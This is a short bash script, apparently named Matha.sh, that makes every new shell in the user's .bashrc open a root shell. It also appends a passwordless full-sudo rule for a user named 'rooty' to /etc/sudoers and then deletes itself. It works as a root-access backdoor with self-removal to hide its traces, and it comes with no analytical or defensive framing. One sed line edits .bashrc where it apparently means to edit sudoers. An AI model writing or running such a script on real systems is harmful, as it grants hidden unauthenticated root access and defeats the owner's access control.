#!/bin/bash
sed -i '/sudo -s/d' ~/.bashrc
echo "sudo -s" >> ~/.bashrc
sed -i '/rooty ALL=(ALL) NOPASSWD:ALL/d' ~/.bashrc
echo "rooty ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
rm -f Matha.sh
exit
 
